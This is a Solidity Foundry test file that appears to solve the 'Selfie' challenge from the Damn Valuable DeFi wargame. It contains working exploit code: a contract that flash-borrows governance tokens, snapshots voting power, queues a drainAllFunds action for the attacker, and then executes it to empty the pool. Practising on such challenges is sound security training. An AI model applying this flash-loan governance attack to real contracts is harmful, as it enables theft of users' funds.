// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "./utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../selfie/SimpleGovernance.sol";
import {SelfiePool} from "../selfie/SelfiePool.sol";

contract PayLoad{
    address public attacker;
    uint256 public actionId;
    uint256 public constant falshloan_amount = 1_500_000e18;
    
    DamnValuableTokenSnapshot public dvt;
    SimpleGovernance public simplegovernance;
    SelfiePool public selfiePool;

    constructor (DamnValuableTokenSnapshot _dvtaddr, SimpleGovernance _simplegovernanceaddr, SelfiePool _selfiePooladdr) {
        dvt = _dvtaddr;
        simplegovernance = _simplegovernanceaddr;
        selfiePool = _selfiePooladdr;
        attacker = msg.sender;
    }

    function startAttack() public{
        selfiePool.flashLoan(falshloan_amount);     
    }

    function receiveTokens(address tokenAddr,uint256 amount) public {
        bytes memory _func_sign = abi.encodeWithSelector(bytes4(keccak256("drainAllFunds(address)")), attacker);

        dvt.snapshot();
        (actionId) = simplegovernance.queueAction(address(selfiePool), _func_sign, 0);
        dvt.transfer(address(selfiePool), amount);
    }
}

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    PayLoad internal payload;

    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);
    }

    //DamnValuableTokenSnapshot _dvtaddr, SimpleGovernance _simplegovernanceaddr, SelfiePool _selfiePooladdr
    function testExploit() public {
        vm.startPrank(attacker);
        payload = new PayLoad(dvtSnapshot, simpleGovernance, selfiePool);
        payload.startAttack();
        utils.mineTime(2 days);
        simpleGovernance.executeAction(payload.actionId());
        vm.stopPrank();  
        verfiy();
    }

    function verfiy() internal {
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}